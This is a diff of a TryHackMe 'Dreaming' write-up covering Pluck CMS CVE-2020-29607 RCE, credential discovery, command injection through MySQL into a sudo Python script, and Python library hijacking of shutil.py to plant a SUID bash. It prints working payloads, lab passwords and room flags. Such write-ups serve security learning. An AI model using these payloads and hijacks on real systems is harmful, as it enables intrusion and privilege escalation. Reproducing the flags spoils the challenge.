@@ -5,214 +5,292 @@ categories: [TryHackMe, Easy]
 tags: [pluck-cms, cve-2020-29607, command-injection, python-hijacking, privesc, mysql]
 ---
 
-## Summary
+## The Hunt Begins
 
-Dreaming is an Easy-rated TryHackMe room themed around Neil Gaiman's "The Sandman" series. The attack chain involves:
-- Exploiting Pluck CMS 4.7.13 with authenticated RCE (CVE-2020-29607)
-- Credential discovery in configuration files
-- Command injection via MySQL database manipulation
-- Python library hijacking through writable system modules
+A box themed around Neil Gaiman's *The Sandman*. Four users—Lucien, Death, Morpheus—all characters from the Dreaming. *Someone had fun with this one.*
 
-## Target Information
-
-| Property | Value |
-|----------|-------|
+| Target | Value |
+|--------|-------|
 | Platform | TryHackMe |
 | Difficulty | Easy |
-| Objective | Capture all flags |
+| Theme | The Sandman |
 
 ---
 
-## Phase 1: Reconnaissance
+## Reconnaissance
 
-Starting with a comprehensive port scan to identify exposed services and their versions.
+Two ports. Just two.
 
-```bash
-nmap -sV -sC -Pn --top-ports 2000 10.82.132.190
-```
+<!-- TODO: Screenshot - Nmap scan results -->
 
-**Results:**
+| Port | Service | Version |
+|------|---------|---------|
+| 22 | SSH | OpenSSH 8.2p1 |
+| 80 | HTTP | Apache 2.4.41 |
 
-| Port | Service | Version | Notes |
-|------|---------|---------|-------|
-| 22 | SSH | OpenSSH 8.2p1 Ubuntu | Modern version |
-| 80 | HTTP | Apache 2.4.41 | Default page showing |
+SSH was modern—no quick wins there. But Apache showing its default page? *Interesting.* Default pages mean the real app is hiding in a subdirectory.
 
-The Apache default page indicates a web application is likely installed in a subdirectory.
+<details markdown="1">
+<summary>💡 Hint - What next?</summary>
+
+Directory brute force. `gobuster` with a common wordlist.
+
+</details>
+
+> **RED Team Logic:** Default Apache page = subdirectory hunting. Always.
+{: .prompt-tip }
 
 ---
 
-## Phase 2: Web Enumeration
+## Web Enumeration
 
-### Directory Brute Force
+Gobuster found `/app`. Directory listing enabled—*rookie mistake*.
 
-```bash
-gobuster dir -u http://10.82.132.190/ -w /usr/share/wordlists/dirb/common.txt -t 50
-```
+<!-- TODO: Screenshot - /app directory listing -->
 
-**Key finding:** `/app` directory discovered!
-
-### CMS Identification
-
-Browsing to `/app/` revealed directory listing enabled with a folder named `pluck-4.7.13/`.
+Inside: `pluck-4.7.13/`. Version number right in the folder name.
 
 | Property | Value |
 |----------|-------|
 | CMS | Pluck |
-| Version | **4.7.13** |
+| Version | 4.7.13 |
 | Location | `/app/pluck-4.7.13/` |
+
+> **RED Team Insight:** Version numbers in folder names are gifts. Tells us exactly what to search in exploit-db.
+{: .prompt-tip }
 
 ---
 
-## Phase 3: Vulnerability Research
+## Vulnerability Research
 
 ```bash
 searchsploit pluck 4.7
 ```
 
-**Exact match found:**
-- **CVE-2020-29607** - Pluck CMS 4.7.13 File Upload Remote Code Execution
-- Requires authentication
+Exact match: **CVE-2020-29607** — File Upload RCE. *Authenticated.*
 
-Testing common passwords on the Pluck login page (`/login.php`), the password `password` grants access.
+<!-- TODO: Screenshot - searchsploit results -->
+
+Pluck uses password-only authentication. No username. Tried `password`—it worked.
+
+<details markdown="1">
+<summary>🔑 Credentials - Pluck CMS</summary>
+
+**Password:** `password`
+
+</details>
+
+> **Why this works:** Developers leave default/weak passwords. Always try the obvious first.
+{: .prompt-warning }
 
 ---
 
-## Phase 4: Initial Foothold
+## Initial Foothold
 
-### Exploiting CVE-2020-29607
+Downloaded the exploit, ran it:
 
 ```bash
-wget https://www.exploit-db.com/raw/49909 -O pluck_rce.py
 python3 pluck_rce.py 10.82.132.190 80 password /app/pluck-4.7.13
 ```
 
-**Result:** Webshell uploaded to `/app/pluck-4.7.13/files/shell.phar`
+Webshell uploaded to `/app/pluck-4.7.13/files/shell.phar`. Shell as `www-data`.
 
-Initial shell as `www-data`. Three interesting users discovered:
-- **lucien** - Librarian of the Dreaming
-- **death** - Morpheus's sister
-- **morpheus** - Lord of Dreams
+<!-- TODO: Screenshot - p0wny webshell -->
 
-### Credential Discovery
+Three users caught my eye in `/etc/passwd`:
+- **lucien** — The Librarian
+- **death** — Morpheus's sister
+- **morpheus** — Lord of Dreams
+
+Checked `/opt` for scripts. Found `test.py` with hardcoded credentials.
+
+<details markdown="1">
+<summary>🔑 Credentials - Lucien</summary>
 
 Found in `/opt/test.py`:
-
 ```python
 password = "HeyLucien#@1999!"
 ```
 
+</details>
+
 ---
 
-## Phase 5: Privilege Escalation
+## Privilege Escalation
 
-### Stage 1: www-data → lucien
+### www-data → lucien
 
 ```bash
 ssh lucien@10.82.132.190
-# Password: HeyLucien#@1999!
 ```
 
-**Flag:** `lucien_flag.txt` captured!
+<details markdown="1">
+<summary>🚩 Flag - Lucien</summary>
 
-### Stage 2: lucien → death
+Check `~/lucien_flag.txt`
 
-Checking sudo permissions:
+</details>
+
+---
+
+### lucien → death
 
 ```bash
 sudo -l
-# (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
 ```
 
-The script has a command injection vulnerability via MySQL database values:
+Lucien can run `/home/death/getDreams.py` as death. *Without password.*
+
+<!-- TODO: Screenshot - sudo -l output -->
+
+The script pulls data from MySQL and echoes it with `shell=True`:
 
 ```python
 command = f"echo {dreamer} + {dream}"
 shell = subprocess.check_output(command, text=True, shell=True)
 ```
 
-MySQL credentials found in bash history: `lucien42DBPASSWORD`
+*Classic command injection.* Control the database, control the command.
 
-**Exploitation:**
+<details markdown="1">
+<summary>🔑 Credentials - MySQL</summary>
+
+Found in `~/.bash_history`:
+```
+mysql -u lucien -plucien42DBPASSWORD
+```
+
+</details>
+
+> **Why this matters:** `shell=True` with user-controlled input = command injection. The values come from MySQL—if we control the DB, we control execution.
+{: .prompt-warning }
+
+<details markdown="1">
+<summary>🎯 Solution - Command Injection</summary>
 
 ```bash
 mysql -u lucien -p'lucien42DBPASSWORD' library \
   -e "UPDATE dreams SET dream = '; cat /home/death/death_flag.txt #' WHERE dreamer = 'Alice';"
+
 sudo -u death /usr/bin/python3 /home/death/getDreams.py
 ```
 
-**Death's Flag:** `THM{1M_TH3R3_4_TH3M}`
+</details>
 
-Death's password extracted from getDreams.py: `!mementoMORI666!`
+<details markdown="1">
+<summary>🚩 Flag - Death</summary>
 
-### Stage 3: death → morpheus
+`THM{1M_TH3R3_4_TH3M}`
 
-Using LinPEAS, discovered that the **death group** has write access to `/usr/lib/python3.8/shutil.py`.
+</details>
 
-A cron job runs `/home/morpheus/restore.py` as morpheus, which imports shutil:
+Extracted death's password from the script itself:
+
+<details markdown="1">
+<summary>🔑 Credentials - Death</summary>
+
+From `/home/death/getDreams.py`:
+```python
+DB_PASS = "!mementoMORI666!"
+```
+
+</details>
+
+---
+
+### death → morpheus
+
+Ran LinPEAS. Found something *unusual*: death group has write access to `/usr/lib/python3.8/shutil.py`.
+
+<!-- TODO: Screenshot - LinPEAS output showing writable shutil.py -->
+
+A cron job runs `/home/morpheus/restore.py` as morpheus:
 
 ```python
 from shutil import copy2 as backup
 ```
 
-**Python Library Hijacking:**
+*Python library hijacking.* Modify `shutil.py`, wait for cron, profit.
 
-Modified `/usr/lib/python3.8/shutil.py` to include:
+> **RED Team Insight:** Writable system Python libraries = game over. Any script importing them executes your code.
+{: .prompt-danger }
 
+<details markdown="1">
+<summary>🎯 Solution - Library Hijacking</summary>
+
+Added to `/usr/lib/python3.8/shutil.py`:
 ```python
 import os
 os.system("cp /home/morpheus/morpheus_flag.txt /tmp/morph_flag && chmod 777 /tmp/morph_flag")
 os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")
 ```
 
-After the cron job executed:
+Wait ~1 minute for cron.
 
-**Morpheus's Flag:** `THM{DR34MS_5H4P3_TH3_W0RLD}`
+</details>
 
-### Stage 4: morpheus → root
+<details markdown="1">
+<summary>🚩 Flag - Morpheus</summary>
 
-SUID bash available at `/tmp/rootbash`:
+`THM{DR34MS_5H4P3_TH3_W0RLD}`
+
+</details>
+
+---
+
+### morpheus → root
+
+SUID bash waiting at `/tmp/rootbash`:
 
 ```bash
 /tmp/rootbash -p
 ```
 
+<details markdown="1">
+<summary>🚩 Flag - Root</summary>
+
+Check `/root/root_flag.txt`
+
+</details>
+
 ---
 
-## Attack Chain Summary
+## The Kill Chain
 
 ```
-www-data (Pluck RCE)
-    │
-    ▼ /opt/test.py credentials
-lucien
-    │
-    ▼ Command injection via MySQL + sudo
-death
-    │
-    ▼ Python library hijacking (shutil.py)
-morpheus
-    │
-    ▼ SUID bash
-root
+www-data ──▶ lucien ──▶ death ──▶ morpheus ──▶ root
+   │            │          │           │
+   └─RCE        └─creds    └─SQLi      └─lib hijack
 ```
 
 ---
 
-## Key Lessons
+## Lessons Learned
 
-1. **Version disclosure is dangerous** - Pluck version in folder name led directly to CVE
-2. **Password reuse** - Lucien's password worked for SSH from a web config file
-3. **Check bash history** - MySQL password was left in `.bash_history`
-4. **Writable system files = game over** - death group write access to shutil.py enabled privilege escalation
-5. **Cron jobs execute code you control** - Library hijacking through writable imports
+1. **Version disclosure** — Folder name gave away exact CVE
+2. **Default passwords** — `password` actually worked
+3. **Bash history** — MySQL creds left in plain sight
+4. **Writable system files** — death group write access = privesc
+5. **Cron + imports** — Library hijacking through scheduled tasks
+
+---
+
+<details markdown="1">
+<summary>🚩 All Flags</summary>
+
+| User | Flag |
+|------|------|
+| lucien | *check the box* |
+| death | `THM{1M_TH3R3_4_TH3M}` |
+| morpheus | `THM{DR34MS_5H4P3_TH3_W0RLD}` |
+| root | *check the box* |
+
+</details>
 
 ---
 
 ## Tools Used
 
-- nmap - Port scanning
-- gobuster - Directory enumeration
-- searchsploit - Exploit research
-- MySQL - Database manipulation
-- LinPEAS - Privilege escalation enumeration
+- nmap, gobuster, searchsploit
+- MySQL, LinPEAS
+- Python (for library hijacking)
